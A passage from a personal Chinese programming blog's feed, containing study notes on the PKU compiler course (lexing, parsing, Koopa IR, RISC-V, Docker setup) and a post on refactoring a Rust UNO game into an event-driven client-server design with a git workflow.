&lt;li&gt;编译: 将源代码编译为汇编代码(assembly)&lt;/li&gt;
&lt;li&gt;汇编: 将汇编代码汇编为目标文件(obj file)&lt;/li&gt;
&lt;li&gt;链接: 将目标文件链接为可执行文件(executable)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;本课程中实现的编译器, 只涉及上述第一点.即将SysY源代码编译成RISC-V汇编语言.在这种意义之下, 编译器通常由以下几个部分组成:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;前端:&lt;/strong&gt; 通过词法分析和语法分析, 将源代码解析成抽象语法树 (abstract syntax tree, AST). 通过语义分析, 扫描抽象语法树, 检查其是否存在语义错误.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;中端:&lt;/strong&gt; 将抽象语法树转换为中间表示 (intermediate representation, IR), 并在此基础上完成一些机器无关优化.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;后端:&lt;/strong&gt; 将中间表示转换为目标平台的汇编代码, 并在此基础上完成一些机器相关优化.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;词法分析阶段&lt;/h3&gt;
&lt;p&gt;词法分析的作用, 是把字节流转换为单词流 (token stream). 词法分析器 (lexer) 会按照某种规则读取文件, 并将文件的内容拆分成一个个 token 作为输出, 传递给语法分析器 (parser). 同时, lexer 还会忽略文件里的一些无意义的内容, 比如空格, 换行符和注释.&lt;/p&gt;
&lt;p&gt;而语法分析的目的, 按照程序的语法规则, 将输入的 token 流变成程序的 AST.&lt;/p&gt;
&lt;h3&gt;语义分析阶段&lt;/h3&gt;
&lt;p&gt;语义分析阶段, 编译器通常会:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;建立符号表&lt;/strong&gt;, 跟踪程序里变量的声明和使用, 确定程序在某处用到了哪一个变量, 同时也可发现变量重复定义/引用未定义变量之类的错误.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进行类型检查&lt;/strong&gt;, 确定程序中是否存在诸如 “对整数变量进行数组访问” 这种类型问题. 同时标注程序中表达式的类型, 以便进行后续的生成工作. 对于某些编程语言 (例如 C++11 之后的 C++, Rust 等等), 编译器还会进行类型推断.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;进行必要的编译期计算&lt;/strong&gt;. SysY 中支持使用常量表达式作为数组定义时的长度, 而我们在生成 IR 之前, 必须知道数组的长度 (SysY 不支持 &lt;a href=&quot;https://en.wikipedia.org/wiki/Variable-length_array&quot;&gt;VLA&lt;/a&gt;), 这就要求编译器必须能在编译的时候算出常量表达式的值, 同时对那些无法计算的常量表达式报错. 对于某些支持元编程的语言, 这一步可能会非常复杂.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;至此, 我们就能得到一个语法正确, 语义清晰的 AST 表示了.&lt;/p&gt;
&lt;h3&gt;IR生成&lt;/h3&gt;
&lt;p&gt;编译器通常会将 AST 转换为另一种形式的数据结构, 我们把它称作 IR. IR 的抽象层次比 AST 更低, 但又不至于低到汇编代码的程度. 在此基础上, 无论是直接把 IR 进一步转换为汇编代码, 还是在 IR 之上做出一些优化, 都相对更容易.&lt;/p&gt;
&lt;p&gt;有了 IR 的存在, 我们也可以大幅降低编译器的开发成本: 假设我们想开发 MM 种语言的编译器, 要求它们能把输入编译成 NN 种指令系统的目标代码, 在没有统一的 IR 的情况下, 我们需要开发 M×NM×N 个相关模块. 如果我们先把所有源语言都转换到同一种 IR, 然后再将这种 IR 翻译为不同的目标代码, 我们就只需要开发 M+NM+N 个相关模块.&lt;/p&gt;
&lt;h3&gt;目标代码生成&lt;/h3&gt;
&lt;p&gt;编译器进行的最后一步操作, 就是将 IR 转换为目标代码, 也就是目标指令系统的汇编代码. 通常情况下, 这一步通常要做以下几件事:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;指令选择:&lt;/strong&gt; 决定 IR 中的指令应该被翻译为哪些目标指令系统的指令. 例如前文的 Koopa IR 程序中出现的 &lt;code&gt;lt&lt;/code&gt; 指令可以被翻译为 RISC-V 中的 &lt;code&gt;slt&lt;/code&gt;/&lt;code&gt;slti&lt;/code&gt; 指令.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;寄存器分配:&lt;/strong&gt; 决定 IR 中的值和指令系统中寄存器的对应关系. 例如前文的 Koopa IR 程序中的 &lt;code&gt;@x&lt;/code&gt;, &lt;code&gt;%cond&lt;/code&gt;, &lt;code&gt;%0&lt;/code&gt; 等等, 它们最终可能会被放在 RISC-V 的某些寄存器中. 由于指令系统中寄存器的数量通常是有限的 (RISC-V 中只有 32 个整数通用寄存器, 且它们并不都能用来存放数据), 某些值还可能会被分配在内存中.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;指令调度:&lt;/strong&gt; 决定 IR 生成的指令序列最终的顺序如何. 我们通常希望编译器能生成一个最优化的指令序列, 它可以最大程度地利用目标平台的微结构特性, 这样生成的程序的性能就会很高. 例如编译器可能会穿插调度访存指令和其他指令, 以求减少访存导致的停顿.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;词法/语法分析初见&lt;/h2&gt;
&lt;p&gt;EBNF 中还会出现一些别的记法:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;A | B&lt;/code&gt; 表示可以推导出 &lt;code&gt;A&lt;/code&gt;, 或者 &lt;code&gt;B&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[...]&lt;/code&gt; 表示方括号内包含的项可被重复 0 次或 1 次.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{...}&lt;/code&gt; 表示花括号内包含的项可被重复 0 次或多次.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在Rust中, lalrpop来帮助生成词法/语法分析器. lalrpop是一个LR/LALR分析器生成器.&lt;/p&gt;
&lt;p&gt;为了使用lalrpop, 我运行了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;cargo add lalrpop --features=lexer
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;块注释(/* */)的正则表达式: &lt;code&gt;\/\*[^\/]*\*\/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;阅读了一下教程的代码, 在虚拟机中运行了一下, 发现报错Rust版本不匹配.所以&lt;code&gt;cargo init&lt;/code&gt;应在虚拟机里面执行.把&lt;code&gt;edition&lt;/code&gt;改为2021,&lt;code&gt;version&lt;/code&gt;改为3后恢复了正常.编译时间比较久,然后就可以看到输出了.&lt;/p&gt;
&lt;h2&gt;解析&lt;code&gt;main&lt;/code&gt;函数&lt;/h2&gt;
&lt;p&gt;上一节我们借助词法/语法分析器解析了&lt;code&gt;main&lt;/code&gt;函数,但是只能把输入的源代码转换成, 呃, 源代码, 而不是 AST.&lt;/p&gt;
&lt;h3&gt;设计AST&lt;/h3&gt;
&lt;p&gt;我在src/下面创建了 &lt;code&gt;ast.rs&lt;/code&gt;, 里面放置了一些结构体, 然后创建 &lt;code&gt;lib.rs&lt;/code&gt;暴露 &lt;code&gt;ast.rs&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;重要的是在 &lt;code&gt;sysy.lalrpop&lt;/code&gt;里面使用这些新结构体,一定要在第一行前面加上
&lt;code&gt;use compiler::ast::*;&lt;/code&gt;
教程没有提这行加在哪里,我试了很多地方😭,第二行也不行,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不得不说编译好慢啊&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这样我们得到了AST: &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CompUnit {
    func_def: FuncDef {
        func_type: Int,
        id: &amp;quot;main&amp;quot;,
        block: Block {
            stmt: Stmt {
                num: 3,
            },
        },
    },
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;很好!&lt;/p&gt;
&lt;h2&gt;Lv1.4 IR生成&lt;/h2&gt;
&lt;p&gt;我们已经有了AST,现在要变成Koopa IR&lt;/p&gt;
&lt;h3&gt;语义分析&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;在课程实践中, 所有的测试用例均为符合语法/语义规范的 SysY 程序. &lt;strong&gt;我们不要求你编写的编译器具备处理语法/语义错误的能力, 也不会考察这些内容.&lt;/strong&gt; 但我们希望学有余力的同学, 能够在自己的编译器中检查这些问题, 并对其作出合适的处理, 比如像 &lt;code&gt;clang&lt;/code&gt; 或 &lt;code&gt;rustc&lt;/code&gt; 一样, 给出精确到行列的错误信息, 甚至具备忽略错误继续扫描, 以及对错误给出修改建议的高级功能.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;🤔&lt;/p&gt;
&lt;h3&gt;Koopa IR基础&lt;/h3&gt;
&lt;p&gt;本章中我们只会用到函数返回指令和整数常量, 也就是 &lt;code&gt;Return&lt;/code&gt; 和 &lt;code&gt;Integer&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;这个程序写出来长这样:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fun @main(): i32 {  // main 函数的定义
%entry:             // 入口基本块
  ret 0             // return 0
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;生成Koopa IR&lt;/h3&gt;
&lt;p&gt;为了生成字符串形式的 &lt;code&gt;Koopa IR&lt;/code&gt;, 我决定调用&lt;code&gt;Koopa IR&lt;/code&gt;框架提供的接口.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这真是掌握Rust的学生的福利!有接口当然是使用接口了,省去了一大堆文本字符串处理.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;研究了一番&lt;a href=&quot;https://docs.rs/koopa/latest/koopa/ir/index.html&quot;&gt;Koopa IR文档&lt;/a&gt;后, 我写出了针对本章要求的AST -&amp;gt; Koopa IR转换.&lt;/p&gt;
&lt;p&gt;在虚拟机中执行测试:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;autotest -koopa -s lv1 /root/compiler
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;终端如下输出:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 17.95s
running test &amp;quot;0_main&amp;quot; ... PASSED
running test &amp;quot;1_comments&amp;quot; ... PASSED
running test &amp;quot;2_int_dec&amp;quot; ... PASSED
running test &amp;quot;3_int_oct&amp;quot; ... PASSED
running test &amp;quot;4_int_hex&amp;quot; ... PASSED
running test &amp;quot;5_compact&amp;quot; ... PASSED
running test &amp;quot;6_whitespaces&amp;quot; ... PASSED
PASSED (7/7)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过了!&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Wed, 13 Aug 2025 16:00:00 GMT</pubDate></item><item><title>UNO游戏:事件驱动编程 | Rust</title><link>https://tankimzeg.top/blog/rust/edp-uno-game/</link><guid isPermaLink="true">https://tankimzeg.top/blog/rust/edp-uno-game/</guid><description>上次写的UNO游戏只是一个入门练习单机程序,没有任何实用性.这次,我已经学完Rust的所有重要概念,故尝试将其重构为联机游戏.</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/rust/edp-uno-game/&quot;&gt;https://tankimzeg.top/blog/rust/edp-uno-game/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;软件设计&lt;/h2&gt;
&lt;p&gt;对软件开发的生命周期来说,首先就是需求分析和架构设计.这个游戏最终的样子,
就正如我们平时玩的联机卡牌游戏一样,是一个服务端-客户端模式,而原项目显然差得远.&lt;/p&gt;
&lt;h3&gt;原项目问题&lt;/h3&gt;
&lt;p&gt;近日ChatGPT5推出了,我的VSCode Copilot马上就上新模型,感觉挺强大!我跟他聊天,他给我提出很多有用的建议.可惜的是我重启了一下我的电脑,在写本文的时候聊天记录都丢失了,否则我很乐意记录改进项目的经过.&lt;/p&gt;
&lt;p&gt;首先是IO分离的问题,我希望设计一个统一的接口,无论是终端还是GUI客户端都能复用的游戏逻辑.
因此直接打印肯定是不行的.&lt;/p&gt;
&lt;p&gt;由此,GPT5引出了&amp;quot;事件驱动编程&amp;quot;的概念.&lt;/p&gt;
&lt;p&gt;经过一番搜肠刮肚的理解,我突然醒悟!事件驱动编程(Event-Driven Programming)我其实听说过,
我已知的应用场景是GUI开发,比如用户的点击/鼠标滚动都可以抽象为一系列事件,没想到这里也可以用吗?&lt;/p&gt;
&lt;p&gt;在重构的过程中,我也不是一开始就全盘进入EDP的,毕竟这对我来说是第一次接触,我总想用已有思维去重构,
但不久就全部失败了,因为我发现UnoGame,Player有些部分总是耦合在一起,非常恶心.我搜索了一下EDP,
知乎的这篇文章阐述了症结所在:
&lt;a href=&quot;https://zhuanlan.zhihu.com/p/22111320&quot;&gt;面向事件编程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;相反,通过返回一个个事件给事件总线(Bus),相当于一个路由模块,再把事件分发,
既能实现服务端和客户端的通信,又能简化游戏主体逻辑的代码,还能为此编写不同的客户端!
于是我下定决心重构代码.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么本项目适用?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;领域模型天然是“事件流”。UNO 的核心状态变化都是离散事件：如加入玩家、出牌、抽牌、跳过、
反转、惩罚、换人、结束等，项目已用一个集中枚举表达它们：&lt;code&gt;game::events::GameEvent&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;逻辑与界面/网络解耦。游戏核心只需产出事件即可，由外层决定把事件用于日志、UI 展示或网络广播。
你已经有事件总线与处理器接口：&lt;code&gt;ports::bus::EventBus&lt;/code&gt;、&lt;code&gt;ports::bus::EventHandler&lt;/code&gt;、
以及一个简单的控制台处理器 &lt;code&gt;ports::bus::ConsoleLogger&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;组合简单，可多路消费。同一事件可被多个订阅者并行消费（日志、观战、统计、录像等），
无需更改核心逻辑。&lt;/li&gt;
&lt;li&gt;方便网络协议映射。服务端可以直接把产生的 &lt;code&gt;GameEvent&lt;/code&gt; 封装并下发给客户端：&lt;code&gt;protocol::server2client::ServerMessage::Event&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;更易测试与回放。方法已返回事件序列以便断言：&lt;code&gt;game::uno_game::UnoGame&lt;/code&gt; 的 &lt;code&gt;init_game&lt;/code&gt;、&lt;code&gt;play_card&lt;/code&gt;、&lt;code&gt;draw_card&lt;/code&gt; 都返回 &lt;code&gt;Vec&amp;lt;GameEvent&amp;gt;&lt;/code&gt;，天然适合单元测试和事件回放。&lt;/li&gt;
&lt;li&gt;扩展友好。新增可视化 UI、WebSocket 推送或统计模块，只需注册新的事件处理器，不影响游戏引擎。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;经过一天的EDP重构,目前游戏主体已经重构为事件驱动,设计了一系列GameEvent.接下来就是消息协议设计和服务端客户端的架构设计了.&lt;/p&gt;
&lt;p&gt;首先我要想清楚游戏本身会有哪些事件.服务器有一个线程池,每个线程池都可以作为一个牌局,
用户输入房间编号进入.每次有玩家进入,都要向所有服务端广播玩家.一名玩家发送开始指令,不再接受新玩家,牌局开始.&lt;/p&gt;
&lt;p&gt;游戏内部,玩家可向服务端发送PlayCard/CallUNO,对于特殊情况,还有Pass/Challenge等.服务端会向客户端发送DrawCard,要做隐私过滤.游戏结束,发送GameOver,包含获胜者以及分数排名.这属于游戏内事件(GameEvent)&lt;/p&gt;
&lt;p&gt;客户端负责对以上事件进行渲染.从而可以开发出不同的客户端:TUI/GUI/Web端.&lt;/p&gt;
&lt;p&gt;真是一个非常大的工程!不知道要做到什么时候,还要考虑到加密防篡改的协议,例如维护一个sessionID,使用HTTPS等.&lt;/p&gt;
&lt;p&gt;交互UML:
&lt;img src=&quot;https://tankimzeg.top/attachments/EDP-UNO-game_UML.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这只是随手画了个大概,具体设计有所不同,以源码为准:&lt;/p&gt;
&lt;p&gt;import RepositoryCard from &amp;quot;@/components/mdx/RepositoryCard.astro&amp;quot;;&lt;/p&gt;
&lt;RepositoryCard repo=&quot;TanKimzeg/uno&quot; image=&quot;https://raw.githubusercontent.com/TanKimzeg/uno/main/.github/image.png&quot;/&gt;


&lt;h2&gt;改进方向&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; GameOver优雅处理&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; 优化出牌体验&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; 加密/防抓包外挂&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; 限时出牌&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; 完善挑战机制: &lt;a href=&quot;https://zhuanlan.zhihu.com/p/717079545&quot;&gt;UNO规则&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;编写服务端&lt;/h2&gt;
&lt;p&gt;单线程(即一个房间)的服务端是我亲自编写.处理Client2Server消息,发送Server2Client和GameEvent事件,如同上面简单的UML示例一样.通过将ShareState封在&lt;code&gt;handle_events&lt;/code&gt;里面,在每次&lt;code&gt;publish&lt;/code&gt; 广播的时候自动发布,客户端更新渲染.&lt;/p&gt;
&lt;p&gt;异步服务器用到了&lt;code&gt;tokio&lt;/code&gt;库,其API我根本不熟悉.由ChatGPT5编写,我反复测试改进.异步的处理很不一样,独立于我设计的EventHandler trait对象.&lt;/p&gt;
&lt;h2&gt;编写TUI客户端&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/282776001&quot;&gt;什么是 GUI、CLI 和 TUI? &lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;TUI 是基于文本的用户界面或终端用户界面的缩写。“基于文本”这个说法主要是因为你在屏幕上有一堆文本，而“终端用户界面”的说法是因为它们只在终端中使用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在Linux世界中,我曾把一些TUI当成CLI了.实际上TUI的体验很有趣,很有UNIX哲学之美!终端的文件管理器Yazi就是Rust编写的TUI应用,另外,在升级软件包的时候也见过TUI提供的选项.&lt;/p&gt;
&lt;p&gt;我第一次开发TUI应用, 在ChatGPT5帮助编写的UI框架.那些API调用都由AI写好.我写了TUI客户端的事件处理部分,也调整了一些卡片布局:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/EDP-UNO-game_overview.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/EDP-UNO-game_scores.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;很看的UI界面让人欣慰!&lt;/p&gt;
&lt;h2&gt;Github项目协作&lt;/h2&gt;
&lt;p&gt;我给开源项目提过ISSUE和PR.这次来当自己代码的审查员.在将服务端交给AI开发之前,为了避免破坏性的修改,我先确保工作区干净,然后签出一个开发分支:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;git checkout -b feat/threadpool-server
git push -u origin feat/threadpool-server
git reflog  
git branch -a  # 可以看到新分支
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;搞好之后,可以增加Cargo.toml中的版本号,然后准备合并到main分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;git fetch origin
git checkout main
git pull origin main
git checkout feat/threadpool-server
git merge origin/main
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;提交最终整理:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;git add .
git commit -m &amp;quot;feat: multi-room async server&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打开Github,最为仓库的主人,我可以合并分支:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;打开仓库 -&amp;gt; Compare &amp;amp; pull request&lt;/li&gt;
&lt;li&gt;标题：feat: multi-room async server&lt;/li&gt;
&lt;li&gt;描述贴上变更要点与测试步骤&lt;/li&gt;
&lt;li&gt;选择 “Squash and merge” (整洁) 或 “Rebase and merge”&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;合并后可以打标签:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;git checkout main
git pull origin main
git tag -a v0.1.1 -m &amp;quot;v0.1.1 multi-room async server&amp;quot;
git push origin v0.1.1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看标签:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;git tag -a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发布Github Release:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Releases -&amp;gt; Draft new release -&amp;gt; 选择 v0.1.1 标签 -&amp;gt; 填写要点 -&amp;gt; Publish&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;清理分支:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;git branch -d feat/threadpool-server
git push origin --delete feat/threadpool-server
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;总结&lt;/h2&gt;
&lt;p&gt;首先是对EDP的心得.任何程序的编写不是一蹴而就的,总是在开发的过程中反复重构,逐渐清晰的,逐渐优化的.但也不能完全没有框架思路,否则就没有方向,耗费心力.经过这轮开发,EDP开拓了我的视野,在我脑中留下了一席之地.以后再遇到复杂交互的任务,就得优先考虑EDP了.它跟以往我们习惯的线性思维不一样,也无关并发.横看成岭侧成峰,按线性的思维就会导致大量的耦合和阻塞,而换一个视角,另用事件总线来分别处理各种事件,反而豁然开朗.&lt;/p&gt;
&lt;p&gt;其次是对Rust的掌握程度.这次的开发任务虽然繁重,但效率却可观.一方面有AI辅助设计,另一方面则是Rust本身的特点了.在开发过程中,我基本上都在解决程序逻辑的问题,而非像C语言那样在调试莫名其妙的Bug.甚至我连VSCode的调试功能都没有使用(我本来是想试一下的,但是不知道为什么打不了断点,就放弃了,但没有造成开发上的困扰).连Python都要调试/打印去发掘程序运行中的状态机.这是因为编译就能发现错误,&lt;code&gt;cargo check&lt;/code&gt;一下的成本太低了~还有,Rust中难的部分(生命周期/智能指针)在开发中并没有用到太多,可能是因为我编写的是联网应用,需要发送的数据大多只好复制一份,不可能转移所有权,不知道有没有更好的实践能降低开销呢?&lt;/p&gt;
&lt;p&gt;最后是对AI辅助编程的喜悦.为了使用python-env插件(见上一篇博客),我不得不升级了VSCode.这次增加了所谓的MCP服务器,我根本用不到,有点烦.但是更新了很多新的大模型,如Claude Sonnet,以及最近推出的ChatGPT5.本次开发都用的是这个模型.首先我就发现了它的语气跟之前我喜欢用的4o不一样,更专业了,不知道是不是prompt变了.另外它的代码能力和专业知识确实强,肯定是消化了大量Github代码.本来我对AI在Rust这种小众且严格的语言上的表现不抱太大期待,没想到它自主编写的服务端和客户端代码基本没有语法错误,甚至连API都是正确的用法,这说明它的知识非常新,非常准,让我刮目相看了.没有这么强的AI,本轮开发效率要低很多,要走更多弯路.&lt;/p&gt;
&lt;p&gt;虽说有Copilot,但我也绝非等闲之辈.短时间内理解并运用EDP,在公认极难的编程语言上编写联机游戏,自主调试通过编译器的审查,体验一遍Github项目协作流程,忍受长时间专注钻研的寂寞.纵使这样的小天才,也注定难逃被埋没的命运.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Tue, 12 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv0：环境配置 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv0/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv0/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv0/&quot;&gt;https://tankimzeg.top/blog/compiler/lv0/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;Docker配置&lt;/h2&gt;
&lt;p&gt;我的Windows系统里面没有安装docker, 这次还得先安装Docker Desktop. 我以前以为Docker只能在Linux世界中使用, 所以我的WSL里面装了docker, 后来发现Windows也有Docker Desktop, 提供GUI界面, 方便管理,但由于我主要在Linux中用docker,就没去搞. 这次不得不安装一个臃肿的GUI界面,有点烦.一打开安装包,就提示: Docker Desktop requires the Server service to be enabled.&lt;/p&gt;
&lt;p&gt;解决方法是Win+R打开services.msc, 开启Server服务自启动.&lt;/p&gt;
&lt;p&gt;接着,安装程序就失去响应了...真的逆天啊&lt;/p&gt;
&lt;p&gt;更逆天的是默认安装位置在C盘,若要更改位置只能:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;`&amp;quot;D:\Download\Docker Desktop Installer.exe&amp;quot;`  `install --installation-dir=``&amp;quot;D:\Docker&amp;quot;`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在设置中修改镜像的存储位置&lt;/p&gt;
&lt;p&gt;Docker容器的启动方式：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;docker run -it --rm -v /home/max/compiler:/root/compiler maxxing/compiler-dev bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这会在退出后自动删除容器&lt;/p&gt;
&lt;p&gt;如果虚拟机没有被搞坏,我自己觉得这样更好,毕竟不用清除Cargo的缓存:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;docker run -itd -v /.compiler:/root/compiler maxxing/compiler-dev bash
docker restart &amp;lt;container id&amp;gt;
docker exec -it &amp;lt;container id&amp;gt; bash
docker stop &amp;lt;container id&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Koopa IR简介&lt;/h2&gt;
&lt;p&gt;Koopa IR 是一种专为北京大学编译原理课程实践设计的教学用的中间表示 (IR),Koopa IR 是一种强类型的 IR, IR 中的所有值 (&lt;code&gt;Value&lt;/code&gt;) 和函数 (&lt;code&gt;Function&lt;/code&gt;) 都具备类型 (&lt;code&gt;Type&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;我暂时不能理解以上内容.&lt;/p&gt;
&lt;h3&gt;本地运行Koopa IR&lt;/h3&gt;
&lt;p&gt;假设你已经把一个 Koopa IR 程序保存在了文件 &lt;code&gt;hello.koopa&lt;/code&gt; 中, 你可以在实验环境中运行这个 Koopa IR 程序:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;koopac hello.koopa | llc --filetype=obj -o hello.o
clang hello.o -L$CDE_LIBRARY_PATH/native -lsysy -o hello
./hello
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;RISC-V简介&lt;/h2&gt;
&lt;p&gt;在之前的THU rCore中,我接触了RISC-V. 
RISC-V是一种开源的指令系统体系结构 (ISA). RISC-V 没有任何历史包袱, 设计简洁, 高效低能耗, 且高度模块化.相对于我之前在CS:APP中学过的英特尔x86指令集来说, 这又是一个新指令集, 需要从头学习.&lt;/p&gt;
&lt;p&gt;RISC-V 的指令系统由基础指令集 (base instruction set) 和指令集扩展 (extension) 构成. 每个 RISC-V 处理器必须实现基础指令系统, 同时可以支持若干扩展. 常用的基础指令系统有两种:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;RV32I&lt;/code&gt;: 32 位整数指令系统.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RV64I&lt;/code&gt;: 64 位整数指令系统. 兼容 &lt;code&gt;RV32I&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常用的标准指令系统扩展包括:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;M&lt;/code&gt; 扩展: 包括乘法和除法相关的指令.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;A&lt;/code&gt; 扩展: 包括原子内存操作相关的指令.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;F&lt;/code&gt; 扩展: 包括单精度浮点操作相关的指令.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;D&lt;/code&gt; 扩展: 包括双精度浮点操作相关的指令.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C&lt;/code&gt; 扩展: 包括常用指令的 16 位宽度的压缩版本.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们通常使用 &lt;code&gt;RV32/64I&lt;/code&gt; + 扩展名称的方式来描述某个处理器/平台支持的 RISC-V 指令系统类型, 例如 &lt;code&gt;RV32IMA&lt;/code&gt; 代表这个处理器是一个 32 位的, 支持 &lt;code&gt;M&lt;/code&gt; 和 &lt;code&gt;A&lt;/code&gt; 扩展的 RISC-V 处理器.&lt;/p&gt;
&lt;p&gt;在课程实践中, 我的编译器将生成 &lt;code&gt;RV32IM&lt;/code&gt; 范围内的 RISC-V 汇编.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pku-minic.github.io/online-doc/#/misc-app-ref/riscv-insts&quot;&gt;RISC-V 指令速查&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;运行RISC-V汇编&lt;/h3&gt;
&lt;p&gt;假设你已经把一个 RISC-V 汇编程序保存在了文件 &lt;code&gt;hello.S&lt;/code&gt; 中, 你可以在实验环境中将这个 RISC-V 程序汇编并链接成可执行文件, 然后运行这个可执行文件:&lt;/p&gt;
